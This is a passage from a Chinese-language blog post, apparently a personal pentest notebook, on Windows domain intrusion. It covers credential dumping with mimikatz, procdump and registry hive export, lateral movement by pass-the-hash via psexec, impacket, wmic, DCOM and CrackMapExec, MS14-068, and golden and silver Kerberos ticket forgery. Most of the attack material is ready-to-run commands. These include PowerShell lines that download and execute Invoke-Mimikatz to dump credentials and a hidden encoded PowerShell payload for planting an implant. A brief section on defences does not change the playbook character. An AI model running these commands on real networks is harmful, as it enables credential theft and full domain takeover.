挂载在<code>HKLM/SAM</code></p><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20200807163204-78c2e474-d888-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200807163204-78c2e474-d888-1.png"></a></p><p>WIndows运行时无法移动或者复制SAM文件，因为Windows 内核获取并在SAM文件上保留了独占的文件系统锁，并且在操作系统关闭之前不会释放该锁，但是我们可以通过多种技术比如pwdump来转储SAM内容的内存中副本，从而使密码哈希可用于离线暴力攻击。</p><p>后来为了提高针对破解的SAM数据库的安全性, Microsoft 在Windows NT 4.0 中引入了SYSKEY功能。该功能会使用密钥对存储在SAM中的所有本地账户的密码哈希值进行加密。可以通过<code>syskey</code>程序来启用它。</p></blockquote><h4 id="hash抓取"><a href="#hash抓取" class="headerlink" title="hash抓取"></a>hash抓取</h4><p>比较老的工具：<a href="http://www.tarasco.org/security/pwdump_7/index.html">PwDump7</a>，需要管理员权限</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs vim">usage:<br>pwdump7.<span class="hljs-keyword">exe</span> (Dump <span class="hljs-built_in">system</span> passwords)<br>pwdump7.<span class="hljs-keyword">exe</span> -s <span class="hljs-symbol">&lt;samfile&gt;</span> <span class="hljs-symbol">&lt;systemfile&gt;</span> (Dump passwords from <span class="hljs-keyword">files</span>)<br>pwdump7.<span class="hljs-keyword">exe</span> -d <span class="hljs-symbol">&lt;filename&gt;</span> [destionation] (Copy filename <span class="hljs-keyword">to</span> destionation)<br>pwdump7.<span class="hljs-keyword">exe</span> -h (Show this <span class="hljs-keyword">help</span>)<br></code></pre></td></tr></table></figure><p>非常出名的工具：<a href="https://github.com/gentilkiwi/mimikatz">Mimikatz</a></p><blockquote><ul><li>lsass.exe进程读取(内存)</li></ul><p>privilege::debug //提升至debug权限</p><p>sekurlsa::logonpasswords //从lsass.exe的内存中抓取密码hash</p><p>//mimikatz.exe “privilege::debug” “log” “sekurlsa::logonpasswords”</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220404220102572.png"></p><ul><li>online</li></ul><p>privilege::debug</p><p>token::elevate //模拟一个SYSTEM令牌</p><p>lsadump::sam //从sam文件导出密码hash</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220404220228030.png"></p></blockquote><p><a href="https://github.com/peterdocter/quarkspwdump">QuarkPwDump</a>，需编译</p><p>还可以导出<code>SAM和SYSTEM</code>文件再抓取密码</p><blockquote><p>reg save HKLM\SYSTEM system.hive</p><p>reg save HKLM\SAM sam.hive</p><p>reg save HKLM\security security.hive</p></blockquote><p>将把导出的<code>sam.hive</code>跟<code>system.hive</code>文件放到<code>mimikatz</code>下</p><blockquote><ul><li>offline</li></ul><p>lsadump::sam /sam:sam.hive /system:system.hive</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220404220447046.png"></p></blockquote><ul><li>进程导出</li></ul><ol><li><p>任务管理器-&gt;进程中创建转储文件</p></li><li><p><a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump">Procdump</a>是微软的工具，<del>杀毒软件不会拦截</del>360拦截</p></li></ol><blockquote><p>procdump64.exe -accepteula -ma lsass.exe lsass.dmp</p><p>再mimikatz导出密码hash</p><p>sekurlsa::minidump lsass.DMP<br>sekurlsa::logonPasswords full</p></blockquote><p>cs</p><p>powershell</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell">powershell <span class="hljs-string">&quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1&#x27;); Invoke-Mimikatz -DumpCreds&quot;</span><br><br>powershell <span class="hljs-string">&quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1&#x27;); Invoke-Mimikatz -Command \&quot;</span>privilege::debug token::elevate  lsadump::sam <span class="hljs-keyword">exit</span>\<span class="hljs-string">&quot;&quot;</span><br></code></pre></td></tr></table></figure><h4 id="防范抓取明文密码和hash"><a href="#防范抓取明文密码和hash" class="headerlink" title="防范抓取明文密码和hash"></a>防范抓取明文密码和hash</h4><p><strong>1、设置Active Directory2012 R2功能级别</strong></p><p>windows server 2012 R2新增了一个名为<code>受保护的用户</code>的用户组。将需要保护的用户放入该组，则无法使用mimikatz等工具抓取明文密码和散列值了</p><p><strong>2、安装KB2871997</strong></p><p>KB2871997是解决PsExec或IPC远程查看（c$）问题的补丁，被使本地账号不再被允许远程接入计算机系统，但系统默认的本地管理员账号Administrator这个SID为500的用户例外，改名也没法，因为SID是不变的，依旧可以横向获取内网其他计算机的权限，需要禁用默认的Administrator账号，则可防御哈希传递</p><p><strong>1、2总结就是：系统的内存中就不再保存明文的密码，这样利用mimikatz就不能从内存中读出明文密码了。mimikatz的使用需要administrator用户执行，administrators中的其他用户都不行。</strong></p><p><strong>3、通过修改注册表禁止在内存中存储明文密码</strong></p><p>WDigest协议，该协议能够使Windows将明文密码存储在内存中，以方便用户登录本地计算机，可通过修改注册表的方式，解决内存中以明文存储密码的问题</p><p><strong>4、防御mimikatz</strong></p><p>mimikatz在抓取散列值或明文密码时需要使用Debug权限（因为mimikatz需呀和lsass进程进行交互，如果没有Debug权限，mimikatz将不能读取lsass进程）。将拥有Debug权限的本地管理员从Administrator组中删除,重启</p><h2 id="Pass-The-Hash"><a href="#Pass-The-Hash" class="headerlink" title="Pass The Hash"></a>Pass The Hash</h2><p><strong>截取到hash后，哈希传递一般是在非域用户中进行传递，实验时发现，域用户不用进行hash传递就可以建立IPC连接</strong></p><p><code>哈希传递（Pass The Hash）攻击</code>，该方法通过找到与账户相关的密码散列值，通常是<code>NTLM Hash</code>来进行攻击。域环境中，用户登录计算机时使用的大都是域账号，大量计算机在安装时会使用相同的本地管理员账号和密码。若计算机的本地管理员账号和密码是相同的，就可以使用哈希传递的方法登录内网中的其他计算机，这种哈希传递，可以省去破解密码散列值，即获得密码明文的步骤</p><p>Windows中，散列值是用来证明身份的（有正确的用户名和密码散列值，就能通过验证）。在windows server 2012 R2  及之后的操作系统中，默认在内存不会记录明文密码。因此可使用工具将散列值传递到其他计算机，进行权限验证，进而对其他计算机获取控制权限</p><ol><li>mimikatz</li></ol><blockquote><p>privilege::debug</p><p>sekurlsa::pth /user:Administrator /domain:god /ntlm:8a963371a63944419ec1adf687bb1be5  //使用ntlm传递</p><p><strong>Pass the key</strong></p><p>也可以用AES-256等传递，<strong>获取：sekurlsa::ekeys</strong>  </p><p>还是使用IPC等无密码连接到目AES标主机，dir \STU1\C$</p></blockquote><p>可见，没有进行hash修改的IPC等连接会出现登录失败</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220404135504518.png"></p><ol start="2"><li>psexec</li></ol><p>微软官方版本：<a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/psexec">https://docs.microsoft.com/zh-cn/sysinternals/downloads/psexec</a></p><blockquote><p>需要远程系统开启admin$共享（默认是开启的）</p><p>在使用ipc$连接目标系统后，不需要输入账号和密码</p><p>使用PsExec执行命令时，由于创建或删除服务时<strong>会产生大量的日志，可通过日志反推攻击流程</strong></p><p><strong>使用PsExec可以直接获得system权限的交互式shell</strong></p><p>建立IPC后使用，可以弹回一个shell</p><p>net use \\192.168.20.128 “password” /user:Administrator</p><p>//-accepteula 第一次执行PsExec时会弹出确认框，而使用该参数就可以在静默模式下运行而不会被发现 -s system</p><p>psexec.exe -accepteula \\192.168.20.128 -s cmd.exe</p><p>psexec.exe -accepteula \\192.168.20.128 cmd.exe</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/psexec.gif" alt="psexec"></p><p>没有建立IPC</p><p>PsExec.exe \192.168.20.128 -u QWE\Administrator -p password cmd.exe</p></blockquote><p>使用PsExec，会在目标机中创建一个新的服务PSEXESVC；在结束交互后，PsExec服务会自动删除，但是在创建以及删除时会产生大量日志信息，所以可以基于此对攻击者进行溯源。拜读了一下<a href="https://www.secpulse.com/archives/146441.html">酒仙桥六号部队的浅谈PSEXEC做的那些事</a></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220405133254579.png"></p><p><a href="https://github.com/SecureAuthCorp/impacket">impacket</a></p><blockquote><p>python psexec.py  <a href="mailto:&#x41;&#100;&#x6d;&#105;&#110;&#x69;&#115;&#116;&#114;&#97;&#x74;&#x6f;&#114;&#64;&#x31;&#x39;&#x32;&#46;&#x31;&#54;&#56;&#46;&#x32;&#48;&#46;&#x31;&#x32;&#x38;">&#x41;&#100;&#x6d;&#105;&#110;&#x69;&#115;&#116;&#114;&#97;&#x74;&#x6f;&#114;&#64;&#x31;&#x39;&#x32;&#46;&#x31;&#54;&#56;&#46;&#x32;&#48;&#46;&#x31;&#x32;&#x38;</a>   -hashes 11cb3f697332ae4c82681f36d6708901:aba61272394a2f975d6543aa0541b005</p></blockquote><p><a href="https://github.com/maaaaz/impacket-examples-windows">impacket-win</a></p><p>微软自带的psexec我是通过使用mimikatz哈希传递后建立IPC连接然后psexec去获得shell，这个工具包可以自己pth</p><p>用法：</p><blockquote><p>Impacket v0.9.17 - Copyright 2002-2018 Core Security Technologies</p><p>usage: psexec.exe [-h] [-c pathname] [-path PATH] [-file FILE] [-debug]<br>               [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key]<br>               [-dc-ip ip address] [-target-ip ip address]<br>               [-port [destination port]] [-service-name service name]<br>               target [command [command …]]</p><p>PSEXEC like functionality example using RemComSvc.</p><p>positional arguments:<br>target                [[domain/]username[:password]@]&lt;targetName or address&gt;<br>command               command (or arguments if -c is used) to execute at the<br>                     target (w/o path) - (default:cmd.exe)</p><p>optional arguments:<br>-h, –help            show this help message and exit<br>-c pathname           copy the filename for later execution, arguments are<br>                     passed in the command option<br>-path PATH            path of the command to execute<br>-file FILE            alternative RemCom binary (be sure it doesn’t require<br>                     CRT)<br>-debug                Turn DEBUG output ON</p><p>authentication:<br><strong>-hashes LMHASH:NTHASH</strong><br>                     NTLM hashes, format is LMHASH:NTHASH<br>-no-pass              don’t ask for password (useful for -k)<br>-k                    Use Kerberos authentication. Grabs credentials from<br>                     ccache file (KRB5CCNAME) based on target parameters.<br>                     If valid credentials cannot be found, it will use the<br>                     ones specified in the command line<br>-aesKey hex key       AES key to use for Kerberos Authentication (128 or 256<br>                     bits)</p><p>connection:<br>-dc-ip ip address     IP Address of the domain controller. If omitted it<br>                     will use the domain part (FQDN) specified in the<br>                     target parameter<br>-target-ip ip address<br>                     IP Address of the target machine. If omitted it will<br>                     use whatever was specified as target. This is useful<br>                     when target is the NetBIOS name and you cannot resolve<br>                     it<br>-port [destination port]<br>                     Destination port to connect to SMB Server<br>-service-name service name<br>                     This will be the name of the service</p></blockquote><blockquote><p>psexec.exe <a href="mailto:&#x41;&#100;&#109;&#105;&#110;&#105;&#115;&#116;&#x72;&#x61;&#x74;&#x6f;&#114;&#64;&#49;&#x39;&#x32;&#46;&#49;&#x36;&#56;&#46;&#x32;&#x30;&#x2e;&#49;&#50;&#56;">&#x41;&#100;&#109;&#105;&#110;&#105;&#115;&#116;&#x72;&#x61;&#x74;&#x6f;&#114;&#64;&#49;&#x39;&#x32;&#46;&#49;&#x36;&#56;&#46;&#x32;&#x30;&#x2e;&#49;&#50;&#56;</a> -hashes 11cb3f697332ae4c82681f36d6708901:aba61272394a2f975d6543aa0541b005</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220405134813532.png"></p></blockquote><p>msf也有psexec模块</p><ol start="3"><li>WMI</li></ol><p>由于PsExec威力很大，也被列入黑名单，而且容易暴露，于是就使用了隐蔽性更好的WMI</p><p>WMI是“Windows Management Instrumentation”的缩写，WMI是从Windows98开始，系统自带的一系列工具集。WMI提供了/node选项，可以通过135端口上的RPC服务进行远程访问，或者执行远程命令。Windows操作系统默认不会将WMI的操作记录到日志当中，而且因为采用的是无文件攻击，所以导致WMI具有极高的隐蔽性。由此，越来越多的APT开始使用WMI进行攻击，利用WMI可以进行信息收集、探测、反病毒、虚拟机检测、命令执行、权限持久化等操作。</p><blockquote><p>wmic /node:192.168.20.128 /user:Administrator /password:p@ssword123. process call create “cmd.exe /c ipconfig &gt;c:\ip.txt”</p></blockquote><p>建立IPC后，type读取txt</p><blockquote><p>net use \DC “p@ssword123.” /user:Administrator<br>type \DC\C$\ip.txt</p></blockquote><p>使用wmic远程执行命令，在远程系统中启动windows management lnstrumentation  服务（目标服务器需要开放135端口，wmic会以管理员权限在远程系统中执行命令）。如果目标服务器开启了防火墙，wmic将无法进行连接。wmic命令没有回显，需要使用<code>ipc$和type</code>命令来读取信息，若使用wmic执行恶意程序，将不会留下日志</p><p>还是使用impacket的两个工具包，有些还支持socks代理</p><blockquote><p>wmiexec.exe domain/user:password@target-ip</p><p>wmiexec.exe QWE/Administrator:p@<a href="mailto:&#115;&#x73;&#x77;&#x6f;&#114;&#100;&#x31;&#50;&#51;&#46;&#x40;&#x31;&#57;&#50;&#46;&#x31;&#54;&#x38;&#x2e;&#50;&#x30;&#x2e;&#x31;&#x32;&#x38;">&#115;&#x73;&#x77;&#x6f;&#114;&#100;&#x31;&#50;&#51;&#46;&#x40;&#x31;&#57;&#50;&#46;&#x31;&#54;&#x38;&#x2e;&#50;&#x30;&#x2e;&#x31;&#x32;&#x38;</a></p></blockquote><ol start="4"><li><a href="https://github.com/sunorr/smbexec">smbexec</a></li><li>DOM</li></ol><p><code>DCOM（分布式组件对象模型）</code>是微软的一系列概念和程序接口。通过DOCM,客户端程序对象能够向网络中的另一台计算机上的服务器程序对象发送请求。DCOM是基于组件对象模型（COM）的。COM提供了一套允许在同一台计算机上的客户端和服务器之间进行通信的接口（运行在Windows95及之后版本的操作系统中）</p><p><code>Get-CimInstance</code>这个cmdlet（PowerShell命令行）默认只在powershell3.0以上版本中存在。因此只在windows server 2012及以上本本的操作系统才可以使用Get-CimInstance</p><blockquote><p> Get-CimInstance Win32_DCOMApplication //获取DCOM程序列表</p></blockquote><p><code>Windows7、Windows server 2008</code>中默认安装的是<code>powershell 2.0</code>。不支持Get-CimInstance。可以使用如下命令代替</p><blockquote><p>Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_DCOMApplication //获取DCOM程序列表</p></blockquote><p>获取到DCOM程序列表后，<strong>建立IPC</strong>，最后执行命令(这个方法需要关闭系统防火墙。在远程机器上执行命令时，必须使用具有本地管理员权限的账号)</p><ul><li>调用<code>MMC20.Application</code>远程执行命令</li></ul><blockquote><p>$com=[activator]::CreateInstance([type]::GetTypeFromProgID(“MMC20.Application”,”ip”))<br>$com.Document.ActiveView.ExecuteShellCommand(‘cmd.exe’,$null,”/c calc.exe”,”Minimzed”)</p></blockquote><ul><li>调用<code>9BA05972-F6A8-11CF-A442-00A0C90A8F39</code></li></ul><blockquote><p>$com = [Type]::GetTypeFromCLSID(‘9BA05972-F6A8-11CF-A442-00A0C90A8F39’, “ip”)<br>$obj = [System.Activator]::CreateInstance($com)<br>$item = $obj.item()<br>$item.Document.Application.ShellExecute(“cmd.exe”,”/c calc.exe”, “c:\windows\system32”,$null,0)</p></blockquote><ol start="7"><li><strong>批量移动</strong></li></ol><p>CrackMapExec集成了wmiexec、atexe、smbexec，集成了smb扫描,口令爆破等功能,非常适合拿来快速移动</p><p>其中，批量传递hash：(88,90多个目标使用相同hash传递)</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">cme</span> smb <span class="hljs-number">10.73.147.90</span> <span class="hljs-number">10.73.147.88</span> -u administrator -H <span class="hljs-number">852</span>a<span class="hljs-number">844</span>adfce<span class="hljs-number">18</span>f<span class="hljs-number">66009</span>b<span class="hljs-number">4</span>f<span class="hljs-number">14</span>e<span class="hljs-number">0</span>a<span class="hljs-number">98</span>de<br><span class="hljs-attribute">cme</span> smb <span class="hljs-number">10.73.147.90</span> <span class="hljs-number">10.73.147.88</span> -u administrator -H <span class="hljs-number">852</span>a<span class="hljs-number">844</span>adfce<span class="hljs-number">18</span>f<span class="hljs-number">66009</span>b<span class="hljs-number">4</span>f<span class="hljs-number">14</span>e<span class="hljs-number">0</span>a<span class="hljs-number">98</span>de  -x <span class="hljs-string">&quot;whoami&quot;</span><br></code></pre></td></tr></table></figure><p>配合cs上马</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">cme</span> smb <span class="hljs-number">10.211.55.51</span>  <span class="hljs-number">10.211.55.52</span> -u administrator  -H <span class="hljs-number">852</span>a<span class="hljs-number">844</span>adfce<span class="hljs-number">18</span>f<span class="hljs-number">66009</span>b<span class="hljs-number">4</span>f<span class="hljs-number">14</span>e<span class="hljs-number">0</span>a<span class="hljs-number">98</span>de -x <span class="hljs-string">&quot;powershell -nop -w hidden -encodedcommand JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0...&quot;</span><br></code></pre></td></tr></table></figure><h2 id="Mimikatz‘s-AV-Bypass"><a href="#Mimikatz‘s-AV-Bypass" class="headerlink" title="Mimikatz‘s  AV Bypass"></a>Mimikatz‘s  AV Bypass</h2><p>在装有杀毒软件的情况下，上传mimkatz，360火绒都能检测删除，或者进程拦截</p><p>绕过的姿势：<a href="https://www.freebuf.com/articles/web/176796.html">https://www.freebuf.com/articles/web/176796.html</a></p><h2 id="Pass-The-Ticket"><a href="#Pass-The-Ticket" class="headerlink" title="Pass The Ticket"></a>Pass The Ticket</h2><h3 id="Kerberos协议认证过程"><a href="#Kerberos协议认证过程" class="headerlink" title="Kerberos协议认证过程"></a>Kerberos协议认证过程</h3><p>Kerberos协议是一种基于第三方可信主机的计算机网络协议，用来在非安全网络中，对个人通信以安全的手段进行身份认证。Kerberos协议在在内网域渗透中至关重要，白银票据、黄金票据、攻击域控等都离不开kerberos协议。</p><p><strong>关键角色：</strong></p><ul><li><strong>Domain Controller (域控制器)，简称DC，一台计算机，实现用户、计算机的统一管理。</strong></li><li><strong>Key Distribution Center(秘钥分发中心)，简称KDC，默认安装在域控里，包括AS和TGS。</strong> </li><li><strong>Authentication Service(身份验证服务)，简称AS，用于KDC对Client认证。</strong> </li><li><strong>Ticket Grantng Service (票据授予服务)，简称TGS，用于KDC向Client和Server分发Session Key（临时key）。</strong> </li><li><strong>Active Directory(活动目录)，简称AD，用于存储用户、用户组、域相关的信息。</strong> </li><li><strong>Client 客户端，指用户。</strong> </li><li><strong>Server 服务端，可能是某台计算机，也可能是某个服务。</strong></li></ul><p>打个比方：当whoami要和bunny进行通信的时候，whoami就需要向bunny证明自己是whoami，直接的方式就是whoami用二人之间的秘密做秘钥加密明文文字生成密文，把密文和明文文字一块发送给bunny，bunny再用秘密解密得到明文，把明文和明文文字进行对比，若一致，则证明是whoami。</p><p>但是网络中，密文和文字很有可能被窃取，并且只要时间足够，总能破解得到秘钥。所以不能使用这种长期有效的秘钥，要改为短期的临时秘钥。那么这个临时秘钥就需要一个第三方可信任的机构来提供，即KDC（Key Distribution Center）。</p><p>下面讲一下详细的认证步骤，大概分为三个阶段：</p><p><strong>AS-REQ—AS-REP阶段：</strong></p><p>首先Client用自己的哈希值NTLM-hash对timestamp、client-info、server-info等数据进行加密，发送给AS，向AS请求TGT票据。（<strong>AS-REQ</strong>）</p><p>当AS收到Client发来的信息后，AS会先向域控AD请求，询问是否有此Client用户，如果有的话，就会取出该Client的NTLM hash，然后生成一个随机秘钥称为Session-Key as（临时秘钥Session-Key）。并使用Client NTLM-hash 加密 Session-key as 作为一部分内容。</p><p>还有一部分内容就是TGT：使用KDC一个特定账户krbtgt的NTLM-hash对Session-key as、timestamp、Client-info进行的加密。然后将这两部分回复给Client。（<strong>AS-REP</strong>）</p><p>该阶段是Client和AS的认证。</p><p><strong>TGS-REQ—TGS-REP阶段：</strong></p><p>Client 收到AS发来的AS-REP后，先使用自身的 NTLM Hash 解密得到 Session-key as，然后使用 Session-key as 对 Client-Info、timestamp、Server-Info 加密作为一部分，加上TGT ，一并发送给 KDC中的 TGS。（<strong>TGS-REQ</strong>）</p><p>TGS 收到请求后，使用 krbtgt 的 NTLM Hash 解密 TGT，得到 Session-key  as、timestamp、Client-info，同时，使用 TGT 解密出的 Session-key as  解密第一部分内容，得到Client-info、timestamp。  比对这两部分解密得到的内容以验证是否通过。通过后，生成一个新的随机秘钥(Session-Key tgs)，并向Client回复<strong>TGS-REP的</strong>两部分内容：</p><ol><li>一部分是Session-key as 加密的 Session-key tgs</li><li>另一部分是ST(ticket)，即Server NTLM-hash加密的数据(Session-key tgs、timestamp、Client-info)</li></ol><p>该阶段是Client和KDC的通信。</p><p><strong>AP-REQ—AP-REP阶段：</strong></p><p>Client收到<strong>TGS-REP后</strong>，先用自己保存的Session-key as解密出了Session-key tgs。再使用Session-key tgs加密Client-info、timestamp作为一部分内容，另一部分是ST，一并发送给Server。（<strong>AP-REQ</strong>）</p><p>Server 收到Client发来的<strong>AP-REQ</strong>后，用自身的NTLM Hash解密了ST，得到Session-key tgs，再用Session-key  tgs解密第一部分得到Client-info、timestamp。然后与ST的Client-info、timestamp进行对比。timestamp 一般时间为8小时。验证通过后，回复<strong>AP-REP</strong>，最终建立通信。</p><p>上面的PTH攻击，需要获取到NTLM，必须要获得目标的管理员权限，如果没有管理员权限下，要么提权，要么可以试一试PTT</p><h3 id="MS14-068"><a href="#MS14-068" class="headerlink" title="MS14-068"></a>MS14-068</h3><p>PAC是用来验证Client的访问权限的，它会被放在TGT里发送给Client，然后由Client发送给TGS。</p><p>Windows域中使用kerberos协议过程中，为了让服务器判断Client是否有权限访问服务，微软在Windows平台上对Kerberos协议进行了一些扩充，即在协议中增加了PAC（Privilege Attribute Certificate），特权属性证书，也就是这个PAC造成了MS14-068这个漏洞。</p><p>MS14-068是密钥分发中心（KDC）服务中的Windows漏洞。它允许经过身份验证的用户在其Kerberos票证（TGT）中<strong>插入任意的PAC</strong>（表示所有用户权限的结构）。该漏洞位于kdcsvc.dll域控制器的密钥分发中心(KDC)中。<strong>普通用户可以通过呈现具有改变了PAC的Kerberos TGT来获得票证，进而伪造票据获得管理员权限。</strong></p><p><strong>利用条件：</strong></p><blockquote><p>获取任意用户SID</p><p>域内任意账号的密码</p></blockquote><p><strong>利用：</strong></p><p>找利用工具：<a href="https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068">https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068</a></p><p>生成TGT(ccache)</p><blockquote><p>MS14-068 -u <a href="mailto:&#116;&#x65;&#x73;&#116;&#64;&#81;&#x57;&#x45;&#46;&#x69;&#x6f;">&#116;&#x65;&#x73;&#116;&#64;&#81;&#x57;&#x45;&#46;&#x69;&#x6f;</a> -s S-1-5-21-264158955-2367710963-2250079592-1105 -d DC.QWE.io -p p@ssword123.</p></blockquote><p>mimikatz注入票据</p><blockquote><p>kerberos::purge  //清空所有凭证，有其他凭证会影响伪造</p><p>kerberos::list       //列出所有凭证</p><p>kerberos::ptc       //注入票据</p></blockquote><blockquote><p>net use \\DC        …</p></blockquote><h3 id="黄金票据-Golden-ticket"><a href="#黄金票据-Golden-ticket" class="headerlink" title="黄金票据(Golden ticket)"></a>黄金票据(Golden ticket)</h3><p>在Windows的kerberos认证过程中，Client将自己的信息发送给KDC，然后KDC使用krbtgt用户的Hash作为密钥进行加密，生成TGT。那么如果获取到了krbtgt的Hash值，不就可以伪造任意的tgt了吗。<strong>因为krbtgt只有域控制器上面才有，所以使用黄金凭据意味着你之前拿到过域控制器的权限，黄金凭据可以理解为一个后门。</strong></p><blockquote><p>先假设这么一种情况，原先已拿到的域内所有的账户Hash，包括krbtgt这个账户，由于有些原因导致你对域管权限丢失，但好在你还有一个普通域用户权限，碰巧管理员在域内加固时忘记重置krbtgt密码，基于此条件，我们还能利用该票据重新获得域管理员权限，<strong>利用krbtgt的HASH值可以伪造生成任意的TGT(mimikatz)，能够绕过对任意用户的账号策略，让用户成为任意组的成员，可用于Kerberos认证的任何服务</strong>。</p></blockquote><p>攻击者再使用黄金票据进行票据传递攻击时，通常要掌握以下信息：</p><ul><li>需要伪造的域管理员用户名</li><li>完整的域名</li><li>域SID</li><li>krbtgt的NTLM Hash</li></ul><p><strong>利用：</strong></p><p>登录域控抓取krbtgt用户的Hash值并获取域SID</p><p><strong>经测试，win10/server2022抓取会关机，已在此设备上禁用对动态访问控制的Kerberos 支持</strong></p><blockquote><p>privilege::debug</p><p>lsadump::lsa /patch        // 专用于在域控制器上导出用户密码或hash</p><p>或者：</p><p>lsadump::dcsync /domain:QWE.io /user:krbtgt  //取得的sid值后面三位去除</p></blockquote><ul><li>生成票据后注入</li></ul><p>然后在普通域用户机器，用mimikatz生成名为ticket.kirbi的TGT凭证，用户名为Administrator </p><blockquote><p>kerberos::golden /user:Administrator /domain:QWE.io /sid:S-1-5-21-979886063-1111900045-1414766810 /krbtgt:7c4ed692473d4b4344c3ba01c5e6cb63 /ticket:ticket.kirbi</p></blockquote><p>注入TGT票据</p><blockquote><p>kerberos::ptt ticket.kirbi</p></blockquote><p>查看tgt</p><blockquote><p>kerberos::tgt</p></blockquote><blockquote><p>net use \\DC        …</p></blockquote><ul><li>生成并直接导入</li></ul><blockquote><p>privilege::debug<br>kerberos::golden /user:Administrator /domain:QWE.io /sid:S-1-5-21-2189311154-2766837956-1982445477 /krbtgt:7aad81625fab43e7fdb3cd9f399c060c /ptt  //生成票据并导入</p><p>或者也可以使用krbtgt的AES-256<br>privilege::debug<br>kerberos::golden /user:Administrator /domain:QWE.io /sid:S-1-5-21-2189311154-2766837956-1982445477 /aes256:93c335cce03858c917fa2ea98ca79f0b791c93c33ab17936784548114648cda7  /ptt</p></blockquote><h3 id="白银票据-Silver-ticket"><a href="#白银票据-Silver-ticket" class="headerlink" title="白银票据(Silver ticket)"></a>白银票据(Silver ticket)</h3><p>白银票据不同于黄金票据，白银票据的利用过程是伪造TGS，通过已知的授权服务密码生成一张可以访问该服务的TGT。因为在票据生成过程中不需要使用KDC，所以可以绕过域控制器，很少留下日志。而黄金票据在利用过程中由KDC颁发TGT，并且在生成伪造的TGT得20分钟内，TGS不会对该TGT的真伪进行效验。</p><p>白银票据依赖于服务账号的密码散列值，这不同于黄金票据利用需要使用krbtgt账号的密码哈希值，因此更加隐蔽。</p><p>攻击者要利用白银票据进行票据传递攻击，需要掌握下面几个信息：</p><ul><li>域名</li><li>域SID</li><li>目标服务器的FQDN</li><li>可利用的服务</li><li>服务账号的NTLM Hash</li><li>要伪造的用户名</li></ul><p><strong>利用：</strong></p><p>登录域控，抓取共享服务账号hash</p><blockquote><p>privilege::debug</p><p>sekurlsa::logonpasswords</p></blockquote><p>在普通域用户中，生成白银票据</p><blockquote><p>kerberos::golden /domain:QWE.io /sid:SID /target:DC.QWE.io /rc4:hash /service:cifs /user:admin /ptt</p></blockquote><p>其中</p><blockquote><p>/service:目标服务器上面的kerberos服务，此处为cifs</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs mathematica">服务名称                    同时需要的服务<br><span class="hljs-variable">WMI</span>                        <span class="hljs-variable">HOST</span>、<span class="hljs-variable">RPCSS</span><br><span class="hljs-variable">PowerShell</span> <span class="hljs-variable">Remoting</span>        <span class="hljs-variable">HOST</span>、<span class="hljs-variable">HTTP</span><br><span class="hljs-variable">WinRM</span>                      <span class="hljs-variable">HOST</span>、<span class="hljs-variable">HTTP</span><br><span class="hljs-variable">Scheduled</span> <span class="hljs-built_in">Tasks</span>            <span class="hljs-variable">HOST</span><br><span class="hljs-variable">Windows</span> <span class="hljs-built_in">File</span> <span class="hljs-built_in">Share</span>         <span class="hljs-variable">CIFS</span><br><span class="hljs-variable">LDAP</span>                       <span class="hljs-variable">LDAP</span><br><span class="hljs-variable">Windows</span> <span class="hljs-variable">Remote</span> <span class="hljs-variable">Server</span>      <span class="hljs-variable">RPCSS</span>、<span class="hljs-variable">LDAP</span>、<span class="hljs-variable">CIFS</span><br></code></pre></td></tr></table></figure><p>/rc4:域控的计算机账户ntlm hash</p><p>/user:要伪造的用户名(<strong>任意！包括不存在的用户</strong>)</p><p>mimikatz.exe “kerberos::golden /domain:域 /sid:SID /target:域全称 /service:要访问的服务 /rc4:NTLM /user:silver /ptt”即可生成并导入Silver Ticket</p></blockquote><h3 id="黄金票据和白银票据的不同"><a href="#黄金票据和白银票据的不同" class="headerlink" title="黄金票据和白银票据的不同"></a>黄金票据和白银票据的不同</h3><p>访问权限不同：</p><ul><li>黄金票据Golden Ticket：伪造TGT，可以获取任何Kerberos服务权限</li><li>白银票据Silver Ticket：伪造TGS，只能访问指定的服务</li></ul><p>加密方式不同：</p><ul><li>Golden Ticket由krbtgt的Hash加密</li><li>Silver Ticket 由服务账号（通常为计算机账户）Hash加密</li><li>认证流程不同：</li><li>Golden Ticket的利用过程需要访问域控，</li><li>而Silver Ticket不需要</li></ul><p>隐蔽性不同：</p><ul><li>白银票据依赖于服务账号的密码散列值，而黄金票据需要利用krbtgt账号的密码散列值，因此白银票据更隐蔽</li></ul>]]></content>
    
    
    <categories>
      
      <category>内网</category>
      
    </categories>
    
    
